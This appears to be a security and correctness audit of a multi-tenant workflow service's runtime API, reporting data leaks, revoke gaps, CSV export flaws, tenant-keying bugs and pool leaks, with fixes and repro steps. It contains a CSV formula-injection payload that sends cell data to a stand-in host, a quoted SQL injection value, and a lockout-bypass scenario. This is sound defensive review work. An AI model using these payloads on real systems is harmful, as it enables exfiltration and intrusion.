# Area C: Runtime API and tenants

As of HEAD `5f41cd8a`. Read: `src/runtime/*.ts` (all eleven files in full),
`src/tenancy/*.ts` (all four) and `src/pagination.ts`. Also read: the call
sites in `src/http/server.ts`, `src/http/routes.ts`,
`src/http/reporting-routes.ts`, `src/auth/jwt.ts`, `src/auth/login.ts` and
`src/engine/reporting.ts`. Also read: the claim functions in
`src/engine/transition.ts` and the reporting screens in
`packages/web/src/areas/reporting/`.

## Findings

### C-1: `POST /instances/:id/cancel` returns the full instance with `data`, with no visibility check
- Case:
  - An account holds only `system:cancel-any`. That is a role of its own for
    cancel (`authorize.ts:31-32`, `:105`). It is not `system:admin`, and it
    grants no `read`. The account cancels a completed instance it never took
    part in.
  - The function `cancelInstance` takes the fast path. The check
    `requireRole` passes, then `loadInstanceForRead` runs. Next,
    `engineCancelInstance` returns the instance unchanged when
    `status !== "running"`. The handler `handleCancel` answers 200 with the
    whole `Instance` object: `data`, `assignment` and `startedBy`.
  - The same holds for test instances. The call has no side effect. It is a
    pure read past `loadInstanceForActor`.
  - Second way: an administrator revokes the visibility of the starter
    `alice` on her completed instance. After that, `GET /instances/:id`
    correctly denies her access (`internal.ts:202-204`). The cancel endpoint
    `POST /instances/:id/cancel` gives her the full body instead. For the
    starter of an instance that is not running, `canActorCancelInstance`
    returns `true` (`instances.ts:401-405`). No code checks
    `instance_principals_denied`.
- Location: `src/runtime/instances.ts:441-471`, `:399-411`;
  `src/engine/transition.ts:693-700`; `src/http/routes.ts:559-565`;
  `docs/openapi.yaml:887-893` (documents "no-op (still 200)" with schema
  `Instance`)
- Severity: high
- Evidence: confirmed. Read: `instances.ts:441-471` (fast path with no read
  visibility), `transition.ts:693-700` (`return instance` for an instance
  that is not running), `routes.ts:562-563` (`body: updated`),
  `errors.ts:114-137` (no response shaping).
- Counter-evidence sought: the functions `mapError` and `toRes` do not filter
  the body. No middleware filter sits in `server.ts:821-846`. The search
  `git grep cancel` in `test/instance-visibility*.test.ts` finds nothing. So
  no test covers a revoke plus a cancel. The spec
  `instance-visibility-set/spec.md:430-433` counts only `getInstanceView`,
  comments and attachments as "direct read". The cancel path lies outside the
  rule the owner ruling requires ("access must stay revocable").
- Known: new
- Suggestion: cancel returns only a summary with no `data`, for example
  `{instanceId, status, transitionSeq}`. For an instance that is not running,
  cancel throws `InstanceNotRunningError`, as `claimStep` already does
  (`claims.ts:34`). This changes the HTTP response and `docs/openapi.yaml`:
  OpenSpec change (`runtime-api`, `instance-visibility-set`).

### C-2: A claim on a test instance hands over `data` the candidate may not read
- Case: the author `bob` starts a test instance in the player. Its step has
  the candidate `carol`. She gets 403 when she reads `GET /instances/:id`
  (`internal.ts:185-189`). The claim endpoint `POST /instances/:id/claim`
  succeeds for her instead (`transition.ts:1077-1081`). The handler
  `handleClaim` answers with the whole `Instance` object, `data` included
  (`routes.ts:312-313`).
- Location: `src/runtime/claims.ts:32-36`; `src/http/routes.ts:309-315`;
  `src/engine/transition.ts:1071-1086`
- Severity: medium
- Evidence: confirmed (lines above read)
- Counter-evidence sought: CLAIM-1 names the claim itself. It does not name
  the response body. The file `docs/openapi.yaml:504-509` documents the
  response `Instance` for a claim.
- Known: `docs/decisions.md:1548` (CLAIM-1). That entry does not name the
  data handover in the response body.
- Suggestion: solve it in the change for CLAIM-1. Claim, release and delegate
  answer with the assignment state instead of the whole instance. OpenSpec
  change.

### C-3: A revoke has no effect on `scope=started` or on the record
- Case: the administrator revokes the visibility of `alice` on her instance.
  Her screen "Cases I started" (`GET /instances?scope=started`) still lists
  the instance. The row shows status, step label and `assignment`
  (candidates, `claimedBy`). A click on the row ends in 403. She still reads
  history and events through `GET /instances/:id/record` if she also holds
  `system:author`. These include the `visibility.changed` event,
  which names her own revoke and the acting administrator.
- Location: `src/http/routes.ts:510` (sets only `startedBy`);
  `src/runtime/queries.ts:285` (no match against
  `instance_principals_denied`); `src/runtime/record.ts:57-60`
- Severity: medium
- Evidence: confirmed. The function `buildInstanceWhere`
  (`queries.ts:270-300`) does not read the denial table. Only
  `buildVisibleRowSet` (`:499-500`) subtracts it.
- Counter-evidence sought: the spec `end-user-app/spec.md:649-697` says
  nothing about a revoke. But `instance-visibility-set/spec.md:166-170` states
  "A no longer sees it". The function `loadInstanceForActor` explicitly
  applies the revoke to the starter as well (`internal.ts:152-156`,
  `:194-204`). So the list and the detail contradict each other.
- Known: new
- Suggestion: in `scope=started`, exclude the caller's denial row. In
  `getInstanceRecord`, apply the revoke in the starter branch. OpenSpec change
  (`instance-visibility-set`, `end-user-app`).

### C-4: The CSV export has no guard against formula injection
- Case: a participant enters
  `=HYPERLINK("https://x.example/?"&B2;"Details")` in a text field. The
  process owner downloads `GET /reporting/reports/:id/table.csv` and opens the
  file in Excel. Excel evaluates the cell as a formula. The function
  `csvField` adds quotes only for `"`, `,`, CR or LF. A leading `=`, `+`, `-`,
  `@` or tab stays raw. Excel evaluates the formula inside quotes too.
- Location: `src/runtime/reports.ts:436-438`, `:453-464`, `:472-476`;
  `src/http/reporting-routes.ts:252-262`
- Severity: medium
- Evidence: confirmed (code read)
- Counter-evidence sought: no export runs in the browser. The web package
  saves the blob unchanged (`packages/web/src/areas/reporting/api/client.ts:80-81`,
  `ReportBuilderScreen.tsx:221-230`). Neither spec nor test mentions the
  topic. The search `git grep -i formula` in `openspec/specs` and `docs/`
  finds nothing.
- Known: new
- Suggestion: in `csvCellText`, prefix a `'` to a cell that starts with `=`,
  `+`, `-`, `@`, tab or CR. The header with `fieldId` does not need it. This
  changes the export rule of the spec `reporting-data-tables`, so it needs an
  OpenSpec change.

### C-5: Report and CSV hold only the 50 newest rows, and the CSV does not say so
- Case: a process has 3000 instances. The function `executeReport` calls
  `queryInstances(filter, {}, db)` with no `limit`. So `DEFAULT_LIST_LIMIT` =
  50 applies (`internal.ts:22`, `queries.ts:625`). The table shows a note on
  the incomplete result (`ReportTable.tsx:127-129`). The CSV has 50 data rows
  and no note, because `reports.ts:472-476` does not read `result.truncated`.
  No caller reaches a larger row count: the routes pass no limit through, and
  no cursor exists.
- Location: `src/runtime/reports.ts:366`, `:472-476`;
  `src/runtime/queries.ts:625`; `src/runtime/internal.ts:22`
- Severity: medium
- Evidence: confirmed
- Counter-evidence sought: the spec `reporting-data-tables/spec.md:141-143`
  requires only the same rows in JSON and CSV, and that holds. For the table,
  `:122-126` requires a note on the truncated result. For the CSV it requires
  nothing. Neither `docs/authoring-guide.md`, `PRODUCT.md` nor `README.md`
  states the number 50 for reports.
- Known: new
- Suggestion: on `truncated`, the CSV gets a closing row or a header note.
  Document the report's limit. The report passes `MAX_LIST_LIMIT` explicitly.
  OpenSpec change (`reporting-data-tables`).

### C-6: The report builder's date filter drops the last day
- Case: a process owner in Zurich picks the range 1.10.2026 to 31.10.2026 in
  the builder. The code turns it into
  `new Date("2026-10-31").toISOString()`, which is
  `2026-10-31T00:00:00.000Z`. So `created_at <= …` excludes all of 31
  October. The lower bound sits at 02:00 local time (summer time). So cases
  between 00:00 and 01:59 on 1 October are missing. The three reporting views
  of the same area solve this correctly with `fromDateInput` (local start of
  day to 23:59:59.999).
- Location:
  `packages/web/src/areas/reporting/screens/ReportBuilderScreen.tsx:278`,
  `:286`; correct model: `reportingLogic.ts:59-66`
- Severity: medium
- Evidence: confirmed. Per ECMAScript, a date-only string is UTC. The script
  `test:tz` does not cover the builder code, because `package.json:26` tests
  only `reporting-reportingLogic.test.ts`.
- Counter-evidence sought: the function `draftToInput`
  (`reportsLogic.ts:41-55`) passes the values on unchanged. The server does
  not normalize them (`reporting-routes.ts:56-57`).
- Known: new
- Suggestion: in the builder, use `fromDateInput(value, "start"|"end")` and
  `toDateInput`. This is a UI change, so it needs an OpenSpec change
  (`reporting-data-tables`).

### C-7: The login lockout counts per email across all tenants
- Case: SaaS mode. Tenant `acme` has `eve@corp.example`, and tenant `beta` has
  another account with the same address. An attacker tries passwords through
  `beta.detent.example`. After every fourth try, he authenticates through
  `acme.detent.example` with his own account of the same address. Then
  `loginAttempts.delete(normalizedEmail)` also resets the email window for
  `beta`. Against the `beta` account, only the window per address remains.
  Conversely, failed tries in one tenant lock the same address in every
  other tenant.
- Location: `src/auth/login.ts:54`, `:145-146`, `:155`
- Severity: medium
- Evidence: confirmed. The key is only `normalizedEmail` (`:145`). The value
  `tenant` enters only the token claim (`:163`).
- Counter-evidence sought: the map lives at module scope, with one copy for
  all DB handles (`login.ts:54`). The dispatcher does pick the DB per tenant
  (`server.ts:825-840`). The limiter stays untouched by that.
- Known: `docs/decisions.md:624` (SEC-5) names "per-process, in-memory". It
  does not name the missing split by tenant. Partly known.
- Suggestion: extend the key with the tenant key. The planned table
  (`postgres-login-rate-limit`) solves this by itself if it lives in the
  tenant DB. The change should state that explicitly.

### C-8: In SaaS mode, a token from an external IdP never finds its tenant
- Case: the setting `AUTH_ISSUERS` names `https://login.acme.example/`. A
  token from this issuer arrives. The function `tenantKeyOf` returns
  `payload.iss` as the tenant key (`jwt.ts:41`). The function
  `resolveTenantDb` looks it up in `tenants.key` (`server.ts:455-457`). The
  pattern `KEY_PATTERN` = `^[a-z][a-z0-9_-]*$` (`provision.ts:17`) forbids
  `:` and `/`, so this key never exists. Every request ends in 401.
- Location: `src/auth/jwt.ts:33-45`; `src/http/server.ts:452-459`;
  `src/tenancy/provision.ts:17`, `:81`
- Severity: medium
- Evidence: confirmed. The type `IssuerConfig` has no tenant field
  (`jwt.ts:49-54`). The function `parseAuthIssuers` checks only
  `{iss, jwksUrl, audience, rolesClaim}` (`server.ts:360-375`).
- Counter-evidence sought: the spec `multi-tenancy/spec.md:66-67` requires
  "resolve by its `iss`, which stage 7's dispatch already maps". No mapping
  from `iss` to tenant exists anywhere. The only test hit for `iss` plus
  tenant (`test/auth-jwt.test.ts:139`) checks no SaaS mode. This path fails
  closed and leaks no data.
- Known: new
- Suggestion: extend `IssuerConfig` with `tenant`, and map through `iss` in
  `resolveTenantDb`. OpenSpec change (`multi-tenancy`, `jwt-authentication`).

### C-9: Per-tenant connection pools open several times at start and never close
- Case:
  - The server starts in SaaS mode with tenant `acme`. After 500 ms, the
    workers `outbox`, `resolution` and `timers` start together (`poll.ts:29`,
    `host.ts:325-331`). Each calls `live()` and then `handleFor("acme")`. All
    three find `pools.get` empty. Each opens a `new SQL(url)` and runs
    `SELECT 1`.
  - Only the last pool stays in the map. Nothing closes the others with
    `end()`. For an unreachable tenant, each tick and worker creates a new
    `SQL` object with no `end()` (`connections.ts:80-90`). The function
    `close()` only clears the map (`:111`).
  - The comment "A pool opens lazily, on the first request" (`:7`) is wrong.
    The workers open every tenant on the first tick.
- Location: `src/tenancy/connections.ts:7-10`, `:75-91`, `:111`;
  `src/engine/host.ts:315-331`
- Severity: low
- Evidence: confirmed for the race (code read). Assumed for open connections
  that stay hanging. Nobody checked how Bun pools treat orphaned
  `SQL` objects.
- Known: new. The `ponytail:` entry names only the missing eviction.
- Suggestion: cache the promise per key instead of the result. In the
  `catch`, call `db.end()`. The function `close()` ends all pools.

### C-10: A cursor with a wrong value still leads to 500 (ERR-8 only partly fixed)
- Case: a request `GET /instances?cursor=` carries the base64url value of
  `["gestern","inst_x"]`. The function `decodeCursor` lets the value pass,
  because it has the shape "array of two strings". In `listInstances`, the
  cast `'gestern'::timestamptz` then fails. That raises a PostgresError, and
  so a 500 plus `log.error`. The same holds for comments and attachments
  (`pagedRead`). It also holds for the record, where `Number("x")` yields NaN
  and `::int` fails.
- Location: `src/pagination.ts:11-16`, `:30`; `src/runtime/internal.ts:82-86`;
  `src/runtime/queries.ts:546`, `:570`; `src/runtime/record.ts:63-76`
- Severity: low
- Evidence: confirmed. The mapper in `errors.ts:126-137` maps unknown errors
  to 500.
- Counter-evidence sought: the route does not check the cursor
  (`routes.ts:541`).
- Known:
  `openspec/changes/archive/2026-08-18-code-review-record/CODE_REVIEW-2026-07-29.md:370`
  (ERR-8) names exactly this cast case. The fix checks only the shape.
- Suggestion: give `decodeCursor` a validator per position (`Date.parse`,
  `Number.isInteger`), and throw `RequestShapeError`.

### C-11: A saved report with an invalid date returns 500 on every run
- Case: a request `POST /reporting/reports` carries
  `query.createdAfter: "letzte Woche"`. The schema `reportQuerySchema` accepts
  any string (`reporting-routes.ts:56-57`). The server saves the report.
  Every later run fails on the cast `::timestamptz` (`queries.ts:296-297`)
  with 500, a run by a viewer too. The list `GET /instances` checks the same
  value first with `parseInstant` (`routes.ts:437-440`).
- Location: `src/http/reporting-routes.ts:54-59`;
  `src/runtime/queries.ts:296-297`
- Severity: low
- Evidence: confirmed
- Known: new
- Suggestion: use `z.string().refine((s) => !Number.isNaN(Date.parse(s)))`,
  and store the value as `toISOString()`.

### C-12: The definition cache holds every draft snapshot until restart
- Case: each player run creates a new negative version with
  `createDraftSnapshot` (`instances.ts:142`). Then the body lands in the cache
  of `getStore(db)` (`definitions.ts:829-835`). The map grows without bound
  (`definitions.ts:817`). It lives as long as the DB handle
  (`internal.ts:98-106`). In SaaS mode, that means per tenant until restart.
- Location: `src/runtime/internal.ts:98-106`;
  `src/engine/definitions.ts:817-843`
- Severity: low
- Evidence: confirmed for the mechanism. Assumed for the size, which nobody
  measured.
- Known: new
- Suggestion: do not cache negative versions, or bound the cache for them.

### C-13: An editor can push the owner of a report aside
- Case: the account `bob` stands in `editors` on the report of `alice`. He
  sends `PATCH {owner: "bob", editors: ["bob"]}`. The function `updateReport`
  checks only whether the new owner is in the new editor list
  (`reports.ts:166-168`). It applies the patch, so `alice` loses all access. The spec rejects a change whose `editors` lacks the owner. It also
  rejects an owner who is not "already in editors".
- Location: `src/runtime/reports.ts:159-182`; spec
  `openspec/specs/instance-data-tables/spec.md:40-45`
- Severity: low (editors may delete the report anyway,
  `reports.ts:184-193`)
- Evidence: confirmed
- Known: new
- Suggestion: check `nextOwner` against `current.editors`. The old owner must
  stay in `nextEditors`, unless `current.owner` makes the request.

### C-14: Two tenants can get the same database
- Case: the operator mistypes:
  `add-tenant beta Beta postgres://…/tenant_acme`. The function
  `createDatabaseFor` leaves an existing DB untouched (`provision.ts:53-54`,
  `:66-67`). The column `tenants.database_url` has no UNIQUE constraint
  (`store.ts:57-63`). So `acme` and `beta` share all data.
- Location: `src/tenancy/provision.ts:80-98`; `src/tenancy/store.ts:57-63`
- Severity: low (only the operator, through the CLI)
- Evidence: confirmed
- Known: new
- Suggestion: put `UNIQUE` on `database_url`. Or check in `provisionTenant`,
  before the insert, whether another tenant lists the same URL.

### C-15: The admin connection for provisioning loses the URL parameters
- Case: the value `databaseUrl` is
  `postgres://u:p@db/tenant_x?sslmode=require`. The function
  `createDatabaseFor` builds `${protocol}//${user}:${pass}@${host}/postgres`
  from it. So the admin connection for `CREATE DATABASE` runs without
  `sslmode`.
- Location: `src/tenancy/provision.ts:64`
- Severity: low
- Evidence: confirmed
- Known: new
- Suggestion: keep `url.search`, or copy the URL and replace only `pathname`.

### C-16: A visibility revoke does not check the target account
- Case:
  - An administrator revokes the visibility of `alice.m`, but means
    `alice_m`. The function `requireTargetActor` checks only for a non-empty
    string (`routes.ts:581-587`). The function `changeVisibility` writes the
    denial row for the wrong account and answers 204. The intended person
    still sees the instance, and nothing reports the wrong target. By
    contrast, `delegateClaim` checks its target against the account
    directory (`claims.ts:72-75`).
  - Side finding: the comment `visibility.ts:30-33` claims that nothing
    leaks. But an unknown instance returns 500 (`NotFoundError`,
    `errors.ts:97`), and a known one returns 403.
- Location: `src/runtime/visibility.ts:35-45`; `src/http/routes.ts:581-600`
- Severity: low
- Evidence: confirmed
- Known: new
- Suggestion: check the target with `knownUserIds` when the directory knows
  the caller (the same rule as `delegateClaim`).

### C-17: A claim on an unknown instance returns 500 instead of 404
- Case: a request `POST /instances/inst_gibtsnicht/claim` arrives. The function
  `loadForClaim` throws a generic `Error` (`transition.ts:993`). The mapper
  `mapError` answers 500 and writes `log.error`. Release and delegate behave
  the same.
- Location: `src/engine/transition.ts:991-995`; `src/runtime/claims.ts:32-79`
- Severity: low
- Evidence: confirmed
- Known: new
- Suggestion: throw `NotFoundError` and map it to 404 in the claim route.

### C-18: Exports with no importer in `src/tenancy/`
- Case: the symbols `controlPlaneUrl` (`store.ts:31`), `TenantConnections`
  (`connections.ts:42`) and `ProvisionOptions` (`provision.ts:33`) have no
  importer outside their own file.
- Location: as named
- Severity: low
- Evidence: confirmed by `git grep -w` over `src`, `packages`, `test`,
  `scripts` and `e2e`. LSP was not available (see "Not checked").
- Known: new. Per `docs/decisions.md:1793-1800` (Refused #41), exports that
  only tests use stay. Symbols with no importer at all lose their `export`
  there. That applies here.
- Suggestion: delete `export`.

### C-19: The reporting aggregates load the whole range into memory, history twice
- Case: a request
  `GET /reporting/processes/:id/cycle-time?from=1970-01-01&to=2100-01-01`
  arrives.
  The function `parseRange` does not bound the span
  (`reporting-routes.ts:100-110`). The function `selectInRange` loads every
  instance body with `data` (`reporting.ts:96-105`). The function
  `historyByInstance` loads every history row, with an `ANY(ids)` list over
  all IDs. Then `cycleTime` loads the history of the completed instances a
  second time (`:261`), and `sla` loads the whole history once more (`:400`).
- Location: `src/engine/reporting.ts:96-122`, `:201-225`, `:261`, `:400`;
  `src/http/reporting-routes.ts:100-110`
- Severity: medium
- Evidence: confirmed
- Known: `docs/decisions.md:30` describes the in-memory load as an open
  question. It does not name the unbounded span or the double load of the
  history.
- Suggestion: let `scan` return `history`, so that `cycleTime` and `sla`
  reuse it. Also add a maximum span in `parseRange`, or a row cap with
  `truncated`.

## Checked without a finding

- Tenant per request:
  - The key comes from the signed `tenant` claim of a local token, or from
    `iss` of an external one. For a request with no token, it comes from the
    first label of the Host header (`server.ts:452-469`, `jwt.ts:33-45`). The
    cache is per key (`connections.ts:67-77`).
  - A token from tenant X does not reach tenant Y. The claim sits in the
    signature, and `isActiveAccount` checks `sub` in the tenant's DB
    (`jwt.ts:115-123`). A forged, unsigned token does pick the DB. But it
    fails verification before any handler reads.
  - The login route does not verify. There the password decides in the
    chosen DB (`server.ts:561-566`), so an attacker gains nothing. The
    module-wide caches in the runtime area are per DB handle
    (`internal.ts:98`) or per body (`fields.ts:430`).
- Quoting of tenant names: the key must match `^[a-z][a-z0-9_-]*$`
  (`provision.ts:17`, `:81`). The code checks the DB name against
  `^[a-z_][a-z0-9_]*$` and inserts it in double quotes (`provision.ts:56-67`).
  The value `x"; DROP DATABASE y; --` fails both patterns. The only source is
  the CLI (`cli.ts:25-28`). Lookups use parameters (`store.ts:85`,
  `:101-102`).
- Visibility in every query: the single read, comments and attachments go
  through `loadInstanceForActor` (`instances.ts:241`, `comments.ts:44`,
  `:71`, `attachments.ts:50`, `:85`, `:130`). The download also checks
  `instance_id` (`attachments.ts:131-134`). The list with `scope=visible`
  (`queries.ts:485-533`) and the reports (`reports.ts:361-364`) use
  `buildVisibleRowSet`. The spec `instance-visibility-set/spec.md:464-468`
  records the list and detail difference in the assignment reason as known.
  Exceptions: C-1, C-2, C-3.
- A revoke takes effect at once: no cache exists. Each call reads
  `instance_principals_denied` (`internal.ts:196-201`, `queries.ts:499-500`).
  Groups resolve live (`groups.ts:146-148`).
- Claims are atomic: the function `loadForClaim` runs `SELECT … FOR UPDATE`
  (`transition.ts:992`) inside `withTransaction` (`:1031`). The check on
  `claimedBy` follows (`:1077`). Two concurrent claims run in sequence. The
  second gets `AlreadyClaimedError`.
- SQL only through parameters: everything runs through tagged templates. The
  call `db.unsafe` appears only with constant table and column names
  (`internal.ts:83-90`) and for `CREATE DATABASE` (see above). Reports have
  no dynamic ORDER BY and no dynamic columns. The code fixes the sort order
  (`queries.ts:572`, `:641`). The schema `z.object` strips unknown query keys
  such as `processId` or `includeTestInstances` (`reporting-routes.ts:54-59`).
- Pagination: the route caps `GET /instances` at 200 (`routes.ts:540`).
  Comments, attachments and the record cap at 500 (`comments.ts:72`,
  `attachments.ts:86`, `record.ts:62`). The function `listMyReports` has no
  pagination (`reports.ts:213-235`). Its result stays small, because it is
  per actor. Cursor: see C-10.
- Indexes:
  - The indexes on `instance_comments` and `instance_attachments` over
    `(instance_id, created_at, id)` cover the predicates (`store.ts:117`,
    `:134`). So do `instance_principals_page_idx` (`:370`) and the PK of
    `instance_principals_denied` (`:376-380`). So does
    `report_principals_principal_list_idx` (`:577`).
  - N+1: the function `toSummaryItem` resolves the body per row through a
    cached store (`definitions.ts:817-821`). The function
    `resolveVersionCoverage` builds a new store per call (`reports.ts:264`).
    That costs one query per version, which is acceptable.
- Attachments: per file, `MAX_ATTACHMENT_BYTES` sets the limit
  (`routes.ts:359`). The request limit sits at 8 MiB (`server.ts:867`). The
  type must match `MIME_TOKEN_PAIR` (`routes.ts:108`, SEC-8 accepted). The
  server percent-encodes the file name (`server.ts:200-203`). It stores the
  file as `bytea` in the tenant DB (`store.ts:124-134`). The total size per
  instance is SEC-6 (known, `docs/decisions.md:638`).
- Reporting time zone on the server: the function `parseRange` normalizes to
  UTC ISO (`reporting-routes.ts:104-109`). The text comparison on
  `started_at` is correct at fixed width (`reporting.ts:86-105`). Durations
  are `getTime()` differences, so they do not depend on the time zone. For
  the views, the browser computes locally (`reportingLogic.ts:27-30`,
  `:59-66`). The only deviation sits in the builder: C-6.
- The `ponytail:` sites: `connections.ts:8` (no eviction). With no
  deployment, the limit is not reached. But the "lazy" premise is wrong
  (C-9). The site `instances.ts:394` (only the starter or an operator may
  cancel) is not reached. The site `reporting.ts:137` (start step from the
  current version) applies only after a migration that renames the start
  step. So it is not reached.
- Import discipline: no module outside `src/runtime/` imports a sibling
  module directly. The search `git grep` finds only `api.ts` as the entry.

## Repro proposals

- C-1 (role cancel-any): an account with only the cancel-any role cancels a
  completed instance it never took part in. Expected per the finding: 200,
  and the body holds `data` with all field values. As a counter-check, the
  same account reads the same instance and expects 403.
- C-1 (starter): the starter `alice` completes an instance. An administrator
  then revokes her visibility. Her read of the instance expects 403. Her
  cancel returns 200 with `data`, per the finding.
- C-3: after the same revoke, `alice` lists her instances with
  `scope=started`. Per the finding, the list holds the instance.
- C-5: create 60 instances of one process and a report with no filter. Then
  call `GET /reporting/reports/<id>/table.csv`. Expected: 51 rows (header
  plus 50) and no note. The JSON run returns `truncated: true`.
- C-9: start the server in SaaS mode with one tenant, and wait 2 s. Then run
  `SELECT count(*) FROM pg_stat_activity WHERE datname = '<tenant_db>'` in
  the tenant DB. A result above a single pool points to orphaned pools.

## Not checked

- LSP references: the LSP tool aborted with this message:
  `TypeScript 7.0.2 … provides no tsserver.js`. As a substitute, `git grep -w` over all source and test
  directories checked the dead exports.
- The site `src/engine/store.ts:964-965` (`tx.unsafe` with `engineRole`) lies
  outside area C. This audit did not trace it.
- In SaaS mode, `/metrics` and `/readyz` run against `processDb`
  (`server.ts:794`, `:808`) instead of the tenant DBs. That belongs to the
  HTTP area and has no rating here.
- The data source `instance.query` has no actor filter. Per the owner ruling
  (aggregate views stay unfiltered), this audit does not rate it as a
  finding.
- This audit read the runtime behavior (Bun pools, Excel evaluation) and did
  not run it. See the repro proposals.
